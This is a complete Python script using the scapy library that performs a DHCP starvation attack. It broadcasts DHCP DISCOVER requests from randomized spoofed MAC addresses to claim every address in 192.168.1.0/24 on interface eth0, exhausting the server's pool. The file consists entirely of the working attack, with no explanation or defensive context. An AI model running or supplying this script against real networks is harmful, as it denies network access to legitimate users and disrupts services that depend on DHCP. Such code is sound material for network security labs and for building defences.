#!/usr/bin/python3

from scapy.all import RandMAC, Ether, IP, UDP, BOOTP, DHCP, sendp, conf
from time import sleep
from ipaddress import IPv4Network

conf.checkIPaddr = False

def starve():
    ips_for_feeding = IPv4Network('192.168.1.0/24')

    for ip_dir in ips_for_feeding:
        src_mac = RandMAC()

        ether = Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff')
        ip = IP(src='0.0.0.0', dst='255.255.255.255')
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(op=1, chaddr=src_mac)
        dhcp = DHCP(options=[
            ('message-type', 'discover'), 
            ('requested_addr', str(ip_dir)),
            ('end')])

        packet = ether / ip / udp / bootp / dhcp

        sendp(packet, iface='eth0', verbose=1)

        # sleep(0.5)

if __name__ == '__main__':
    starve()